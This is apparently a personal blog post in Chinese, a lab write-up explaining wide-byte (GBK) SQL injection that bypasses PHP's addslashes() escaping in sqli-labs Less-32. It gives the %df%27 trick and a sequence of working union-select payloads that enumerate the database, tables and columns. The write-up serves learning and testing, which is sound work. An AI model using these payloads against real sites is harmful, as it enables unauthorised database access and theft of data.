---
title: "SQL宽字节注入"
date: 2021-03-02T18:58:31+08:00
lastmod: 2021-03-02T18:58:31+08:00
draft: false
keywords: ["sql","注入","安全"]
description: ""
tags: ["sql","注入"]
categories: ["安全"]
author: ""

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: true
autoCollapseToc: false
postMetaInFooter: false
hiddenFromHomePage: false
# You can also define another contentCopyright. e.g. contentCopyright: "This is another copyright."
contentCopyright: false
reward: false
mathjax: false
mathjaxEnableSingleDollar: false
mathjaxEnableAutoNumber: false

# You unlisted posts you might want not want the header or footer to show
hideHeaderAndFooter: false

# You can enable or disable out-of-date content warning for individual post.
# Comment this out to use the global config.
#enableOutdatedInfoWarning: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

搭建本地环境sqli-labs做的宽字节sql注入测试。
<!--more-->
### 宽字节注入原理

在说注入原理前，首先得认识PHP中的**addslashes()**函数：

![](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/addslashes()%E5%87%BD%E6%95%B0.png)



也就是说，当你输入单引号等字符时，addslashes函数会自动加上**\\**对字符进行转义，这样就会使得普通字符型注入只添加单引号闭合无法生效；

那么，要找到注入点就要想办法从addslashes函数逃逸出来。才能实现引号的闭合。这里存在两种办法：

{% note success, 

1. 把addslashes()函数所添加的反斜杠再添加一个反斜杠，对反斜杠进行转义，即“\\\”。
2. 想办法让\\消失。

针对第二种方法，利用的是mysql的一个特性，mysql在使用GBK编码时会认为两个字符时一个汉字（前一个ascii码要大于128，才到汉字的范围）

​					’       ->     \\'      ->   %5c%27

​				%df     ->  %df\\'  ->   %df%5c%27  -> %}

加入单引号时，addslashes()函数会自动添加反斜杠对单引号进行转移，而mysql使用GBK编码时对字符进行编码\\‘就变成了%5c%27，这个时候如果再在%5c%27前面加上一个字符如“%df”（ascii码大于128的字符即可），mysql在进行GBK编码时，会将两个字符%df%5c认为是一个汉字，这个时候单引号就可以逃逸出来进行单引号闭合。

### sqli-labs实例  Less-32

根据题目提示**Bypass addslashex()**以及页面提示即可知道该题为宽字节注入题目。

- 首先我们针对第一种方法进行测试输入id=1看输出结果

![image-20200707121348454](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/sql%E6%B3%A8%E5%85%A5.png)

输入反斜杠和单引号看输出结果

![image-20200707121643216](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/sql%E6%B3%A8%E5%85%A52.png)

从Hint可看到无论输入反斜杠还是单引号，后台最终都会对输入的反斜杠和单引号进行转义。所以此方法行不通。

- 第二种方法测试，让反斜杠进行GBK编码时消失。

输入:?id=%df 会发现返回了一个乱码（中文乱码）说明%df%5c结合成了一个汉字，反斜杠消失。

![image-20200707122357365](D:%5CBLOG%5C_posts%5CSQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%AE%BD%E5%AD%97%E8%8A%82%5Cimage-20200707122357365.png)

反斜杠消失后即可根据常规单引号闭合注入方法进行sql语句的注入。

### sql注入步骤

1.查列数，order by + 数字 进行测试

id=%df%27 order by 3 %23

2.查回显位置

?id=%df%27 union select 1,2,3 %23?

3.查库名

?id=%df%27 union select 1,database(),3 %23

4.查表名

?id=%df%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23

![image-20200707123721606](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/sqlzhuru.png)

5.查列名

?id=%df%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='xxxx'),3 %23

这里输入table_name='users'时，addslashex()函数还会对单引号进行转义。可对users进行hex编码即转为16进制。

![image-20200707123956587](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/sqlzhuru2.png)

得到列名表名即可得到数据库信息。



------

**参考：安全课堂的视频内容。**

**以上内容均为个人理解，如有错误，请指正**